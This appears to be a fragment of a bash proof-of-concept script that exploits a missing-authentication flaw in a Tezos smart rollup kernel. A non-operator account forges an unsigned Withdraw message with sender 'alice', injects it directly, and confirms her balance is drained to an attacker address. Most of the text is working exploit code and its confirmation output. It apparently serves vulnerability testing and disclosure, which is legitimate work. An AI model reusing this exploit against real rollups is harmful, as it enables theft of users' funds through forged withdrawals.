...
main() {
  ...
  # ============================================================
  # ATTACK PoC: a non-operator tz1 (bootstrap2) submits a Withdraw
  # inbox message with sender = "alice" to drain alice's balance
  # to an arbitrary attacker recipient.  Demonstrates that:
  #   - No signature is required (KernelWithdrawReq has 3 strings)
  #   - The operator bearer token plays no role here (we inject
  #     directly via `send smart rollup message`, signed by
  #     bootstrap2 which is NOT the operator)
  #   - The kernel accepts the message and drains alice.
  # ============================================================
  echo "=========================================================="
  echo "ATTACK: alice (${shield_sender}) has ${shield_bridge_deposit} mutez public balance"
  echo "ATTACK: bootstrap2 (NOT operator) injects Withdraw targeting alice"
  echo "=========================================================="

  local attack_recipient="tz1gjaF81ZRRvdzjobyfVNsAeSC6PScjfQwN"  # bootstrap2 (valid tz1)
  local attack_hex
  attack_hex="$("${ROOT}/target/debug/octez_kernel_message" withdraw \
      "${rollup_address}" "${shield_sender}" "${attack_recipient}" "${shield_bridge_deposit}")"
  echo "ATTACK: withdraw message hex (${#attack_hex} chars):"
  echo "${attack_hex}"

  # Key move: submit from bootstrap2, NOT operator.  No bearer token, no operator API.
  octez-client -d "${CLIENT_DIR}" -E "${NODE_ENDPOINT}" -p "${ALPHA_HASH}" -w none \
    send smart rollup message "hex:[ \"${attack_hex}\" ]" from bootstrap2 >/dev/null
  bake_block with-dal

  echo "ATTACK: message injected by bootstrap2; waiting for kernel to process..."
  if await_rollup_u64 "${balance_key}" "0" "POST-ATTACK alice balance drained"; then
    echo "=========================================================="
    echo "VULNERABILITY CONFIRMED: alice's ${shield_bridge_deposit} mutez was drained"
    echo "by a withdraw message signed by bootstrap2 (not operator)."
    echo "No bearer token was needed.  No proof was needed."
    echo "=========================================================="
    exit 0
  else
    echo "UNEXPECTED: alice's balance was NOT drained.  Attack failed."
    echo "This means my analysis was wrong — there IS some auth I missed."
    exit 1
  fi
}
